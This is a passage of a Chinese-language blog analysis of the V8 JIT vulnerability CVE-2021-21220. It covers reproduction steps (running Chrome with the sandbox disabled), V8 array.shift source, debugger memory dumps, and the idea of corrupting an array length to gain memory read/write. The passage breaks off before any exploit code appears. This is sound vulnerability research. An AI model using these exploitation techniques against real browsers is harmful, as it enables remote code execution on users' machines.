<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            CVE-2021-21220 |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"每天都要进步吖~"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2021-21220</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2021-04-30 16:38:26</span>
        <span class="mobile">2021-04-30 16:38</span>
    </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>5.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>24 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="V8远程代码执行漏洞"><a href="#V8远程代码执行漏洞" class="headerlink" title="V8远程代码执行漏洞"></a>V8远程代码执行漏洞</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul>
<li>漏洞名称：V8远程代码执行漏洞</li>
<li>漏洞编号：CVE-2021-21220</li>
<li>漏洞类型：JIT优化导致可构造超长数组进行任意地址读写</li>
<li>漏洞影响：远程代码执行</li>
<li>CVSS3.0：N/A</li>
<li>CVSS2.0：N/A</li>
<li>漏洞危害等级：严重</li>
</ul>
<h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。</p>
<h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p>issue 1196683</p>
<h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p>Chrome最新版本已经修复，请用户及时更新至最新版本。</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装89.0.4389.90的Chrome浏览器</p>
<h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><p>1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。</p>
<p>2、将漏洞文件拖入浏览器中执行</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210421222934275.png" alt="image-20210421222934275"></p>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul>
<li>漏洞文件：instruction-selector-x64.cc</li>
<li>漏洞函数：InstructionSelector::VisitChangeInt32ToInt64</li>
</ul>
<h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><p>(1) js中array-shift实现。</p>
<p>v8源码版本: V8 version 9.1.0 (candidate)</p>
<h4 id="（1）array-shift-tq"><a href="#（1）array-shift-tq" class="headerlink" title="（1）array-shift.tq"></a>（1）array-shift.tq</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> array &#123;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> builtin <span class="title">ArrayShift</span><span class="params">(Context, JSFunction, JSAny, int32)</span>: JSAny;</span></span><br><span class="line"></span><br><span class="line"><span class="function">macro <span class="title">TryFastArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(receiver: JSAny)</span>: JSAny</span></span><br><span class="line"><span class="function">    labels Slow, Runtime &#123;</span></span><br><span class="line">  <span class="keyword">const</span> array: FastJSArray = Cast&lt;FastJSArray&gt;(receiver) otherwise Slow;</span><br><span class="line">  let witness = <span class="built_in">NewFastJSArrayWitness</span>(array);</span><br><span class="line"></span><br><span class="line">  witness.<span class="built_in">EnsureArrayPushable</span>() otherwise Slow;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (array.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> newLength = array.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to right-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:ElementsAccessorBase::SetLengthImpl.</span></span><br><span class="line">  <span class="keyword">if</span> ((newLength + newLength + kMinAddedElementsCapacity) &lt;</span><br><span class="line">      array.elements.length) &#123;</span><br><span class="line">    <span class="keyword">goto</span> Runtime;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to left-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:FastElementsAccessor::MoveElements.</span></span><br><span class="line">  <span class="keyword">if</span> (newLength &gt; kMaxCopyElements) <span class="keyword">goto</span> Runtime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = witness.<span class="built_in">LoadElementOrUndefined</span>(<span class="number">0</span>);</span><br><span class="line">  witness.<span class="built_in">ChangeLength</span>(newLength);</span><br><span class="line">  witness.<span class="built_in">MoveElements</span>(<span class="number">0</span>, <span class="number">1</span>, Convert&lt;intptr&gt;(newLength));</span><br><span class="line">  witness.<span class="built_in">StoreHole</span>(newLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">transitioning macro <span class="title">GenericArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    receiver: JSAny)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="comment">// 1. Let O be ? ToObject(this value).</span></span><br><span class="line">  <span class="keyword">const</span> object: JSReceiver = <span class="built_in">ToObject_Inline</span>(context, receiver);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. Let len be ? ToLength(? Get(O, &quot;length&quot;)).</span></span><br><span class="line">  <span class="keyword">const</span> length: Number = <span class="built_in">GetLengthProperty</span>(object);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. If len is zero, then</span></span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// a. Perform ? Set(O, &quot;length&quot;, 0, true).</span></span><br><span class="line">    <span class="built_in">SetProperty</span>(object, kLengthString, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">// b. Return undefined.</span></span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. Let first be ? Get(O, &quot;0&quot;).</span></span><br><span class="line">  <span class="keyword">const</span> first = <span class="built_in">GetProperty</span>(object, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// 5. Let k be 1.</span></span><br><span class="line">  let k: Number = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 6. Repeat, while k &lt; len</span></span><br><span class="line">  <span class="keyword">while</span> (k &lt; length) &#123;</span><br><span class="line">    <span class="comment">// a. Let from be ! ToString(k).</span></span><br><span class="line">    <span class="keyword">const</span> from: Number = k;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b. Let to be ! ToString(k - 1).</span></span><br><span class="line">    <span class="keyword">const</span> to: Number = k - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c. Let fromPresent be ? HasProperty(O, from).</span></span><br><span class="line">    <span class="keyword">const</span> fromPresent: Boolean = <span class="built_in">HasProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d. If fromPresent is true, then</span></span><br><span class="line">    <span class="keyword">if</span> (fromPresent == True) &#123;</span><br><span class="line">      <span class="comment">// i. Let fromVal be ? Get(O, from).</span></span><br><span class="line">      <span class="keyword">const</span> fromValue: JSAny = <span class="built_in">GetProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ii. Perform ? Set(O, to, fromValue, true).</span></span><br><span class="line">      <span class="built_in">SetProperty</span>(object, to, fromValue);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// i. Perform ? DeletePropertyOrThrow(O, to).</span></span><br><span class="line">      <span class="built_in">DeleteProperty</span>(object, to, LanguageMode::kStrict);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// f. Increase k by 1.</span></span><br><span class="line">    k++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7. Perform ? DeletePropertyOrThrow(O, ! ToString(len - 1)).</span></span><br><span class="line">  <span class="built_in">DeleteProperty</span>(object, length - <span class="number">1</span>, LanguageMode::kStrict);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 8. Perform ? Set(O, &quot;length&quot;, len - 1, true).</span></span><br><span class="line">  <span class="built_in">SetProperty</span>(object, kLengthString, length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 9. Return first.</span></span><br><span class="line">  <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://tc39.github.io/ecma262/#sec-array.prototype.shift</span></span><br><span class="line"><span class="function">transitioning javascript builtin <span class="title">ArrayPrototypeShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    js-implicit context: NativeContext, receiver: JSAny)</span><span class="params">(...arguments)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TryFastArrayShift</span>(receiver) otherwise Slow, Runtime;</span><br><span class="line">  &#125; label Slow &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenericArrayShift</span>(receiver);</span><br><span class="line">  &#125; label Runtime &#123;</span><br><span class="line">    <span class="function">tail <span class="title">ArrayShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        context, LoadTargetFromFrame(), Undefined,</span></span></span><br><span class="line"><span class="params"><span class="function">        Convert&lt;int32&gt;(arguments.length))</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shift函数首先会判断数组的长度是否为0，如果为0，则不会对该数组进行修改；如果不为0，则会将最前面的数组元素pop，之后对<strong>数组长度减一</strong>。当然这里会有是否进行快速shift的选择[7]，由于不管是否进行快速shift都不会影响这个操作结果，所以具体快速shift如何对速度进行优化不在我们的考虑范围内。</p>
<h4 id="（2）smi"><a href="#（2）smi" class="headerlink" title="（2）smi"></a>（2）smi</h4><p>smi在js中为小整数，详见[5]，链接中讲述了v8中不同数据类型的实现。</p>
<p>smi类型中的-1，0，1在内存中的表示如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3c6c0808846d</span><br><span class="line">0x3c6c0808846d: [JSArray]</span><br><span class="line"> - map: 0x3c6c08243951 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3c6c0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3c6c0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3c6c080446c1: [String] in ReadOnlySpace: #length: 0x3c6c0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: -1</span><br><span class="line">           1: 0</span><br><span class="line">           2: 1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope 0x3c6c082123e0</span><br><span class="line">00:0000│  0x3c6c082123e0 ◂— 0x608042531</span><br><span class="line">01:0008│  0x3c6c082123e8 ◂— 0xfffffffe</span><br><span class="line">02:0010│  0x3c6c082123f0 ◂— 0x80431b900000002</span><br><span class="line">03:0018│  0x3c6c082123f8 ◂— 0x82123e100000000</span><br><span class="line">04:0020│  0x3c6c08212400 ◂— 0x8042509</span><br><span class="line">05:0028│  0x3c6c08212408 ◂— 0x608042205</span><br><span class="line">06:0030│  0x3c6c08212410 ◂— 0x82123f5082123d5</span><br><span class="line">07:0038│  0x3c6c08212418 ◂— 0x8042a1d08212345</span><br></pre></td></tr></table></figure>

<p>可以看出-1在smi中表示为0xfffffffe，而0xfffffffe在十六进制有符号表示为-2，这块需要注意。</p>
<h4 id="（3）常见数据结构"><a href="#（3）常见数据结构" class="headerlink" title="（3）常见数据结构"></a>（3）常见数据结构</h4><h5 id="浮点型数组"><a href="#浮点型数组" class="headerlink" title="浮点型数组"></a>浮点型数组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x56008144335</span><br><span class="line">0x56008144335: [JSArray]</span><br><span class="line"> - map: 0x0560082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x05600820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x05600804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x560080446c1: [String] in ReadOnlySpace: #length: 0x05600818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20wx 0x56008144335-1</span><br><span class="line">0x56008144334:  0x082439f1      0x0804222d      0x08144315      0x00000006</span><br><span class="line">0x56008144344:  0x080455b9      0x08212999      0x08042205      0x00000004</span><br><span class="line">0x56008144354:  0x081442fd      0x08144335      0x08243a41      0x0804222d</span><br><span class="line">0x56008144364:  0x0814434d      0x00000004      0x080455b9      0x082129c5</span><br><span class="line">0x56008144374:  0x08042a95      0x00000002      0x00000000      0x41e00000</span><br><span class="line">pwndbg&gt; telescope 0x056008144314</span><br><span class="line">00:0000│  0x56008144314 ◂— 0x608042a95</span><br><span class="line">01:0008│  0x5600814431c ◂— 0x3ff199999999999a</span><br><span class="line">02:0010│  0x56008144324 ◂— 0x3ff3333333333333</span><br><span class="line">03:0018│  0x5600814432c ◂— 0x3ff4cccccccccccd</span><br><span class="line">04:0020│  0x56008144334 ◂— 0x804222d082439f1</span><br><span class="line">05:0028│  0x5600814433c ◂— 0x608144315</span><br><span class="line">06:0030│  0x56008144344 ◂— 0x8212999080455b9</span><br><span class="line">07:0038│  0x5600814434c ◂— 0x408042205</span><br></pre></td></tr></table></figure>

<p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。</p>
<h5 id="“smi数组”"><a href="#“smi数组”" class="headerlink" title="“smi数组”"></a>“smi数组”</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x367b082a9c29: [JSArray]</span><br><span class="line"> - map: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x367b0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x367b080446c1: [String] in ReadOnlySpace: #length: 0x367b0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x367b0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x367b082a9c1d &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x367b08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/12wx 0x367b082a9c1d-1</span><br><span class="line">0x367b082a9c1c: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x367b082a9c2c: 0x0804222d      0x082a9c1d      0xfffffffe      0x08042a95</span><br><span class="line">0x367b082a9c3c: 0x00000006      0x9999999a      0x3ff19999      0x33333333</span><br><span class="line">pwndbg&gt; x/8wx 0x367b082a9c29-1</span><br><span class="line">0x367b082a9c28: 0x082439c9      0x0804222d      0x082a9c1d      0xfffffffe</span><br><span class="line">0x367b082a9c38: 0x08042a95      0x00000006      0x9999999a      0x3ff19999</span><br></pre></td></tr></table></figure>

<p>这是个伪smi数组，是由于本漏洞构造的超长数组的现场。</p>
<p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。（和上面的浮点型数组内存构造是相同的）</p>
<p>在本漏洞利用中，可以通过相对地址写覆盖浮点型数组的长度伪超长，使浮点型数组也具有相对地址读写的能力。</p>
<h4 id="4-指针压缩"><a href="#4-指针压缩" class="headerlink" title="(4)指针压缩"></a>(4)指针压缩</h4><p>参考[89]。64位v8程序中，堆指针高32位地址值是相同的，可以看下面某次v8的调试信息，高32位的的地址值为0xdf2，这个信息存储在寄存器R13位置处。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     0xdf200000000      0xdf20000d000 rw-p     d000 0</span><br><span class="line">     0xdf20000d000      0xdf200040000 ---p    33000 0</span><br><span class="line">     0xdf200040000      0xdf200170000 r-xp   130000 0</span><br><span class="line">     0xdf200170000      0xdf200180000 ---p    10000 0</span><br><span class="line">     0xdf200180000      0xdf200183000 rw-p     3000 0</span><br><span class="line">     0xdf200183000      0xdf200184000 ---p     1000 0</span><br><span class="line">     0xdf200184000      0xdf200194000 r-xp    10000 0</span><br><span class="line">     0xdf200194000      0xdf2001bf000 ---p    2b000 0</span><br><span class="line">     0xdf2001bf000      0xdf2001c0000 ---p     1000 0</span><br><span class="line">     0xdf2001c0000      0xdf2001c3000 rw-p     3000 0</span><br><span class="line">     0xdf2001c3000      0xdf2001c4000 ---p     1000 0</span><br><span class="line">     0xdf2001c4000      0xdf2001ff000 r-xp    3b000 0</span><br><span class="line">     0xdf2001ff000      0xdf208040000 ---p  7e41000 0</span><br><span class="line">     0xdf208040000      0xdf208061000 r--p    21000 0</span><br><span class="line">     0xdf208061000      0xdf208080000 ---p    1f000 0</span><br><span class="line">     0xdf208080000      0xdf20818d000 rw-p   10d000 0</span><br><span class="line">     0xdf20818d000      0xdf2081c0000 ---p    33000 0</span><br><span class="line">     0xdf2081c0000      0xdf2081c3000 rw-p     3000 0</span><br><span class="line">     0xdf2081c3000      0xdf208200000 ---p    3d000 0</span><br><span class="line">     0xdf208200000      0xdf2083c0000 rw-p   1c0000 0</span><br><span class="line">     0xdf2083c0000      0xdf300000000 ---p f7c40000 0</span><br><span class="line">    0x55fe3a44c000     0x55fe3ac71000 r--p   825000 0      /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ac71000     0x55fe3ba48000 r-xp   dd7000 824000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ba48000     0x55fe3bab5000 r--p    6d000 15fa000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3bab5000     0x55fe3bac4000 rw-p     f000 1666000 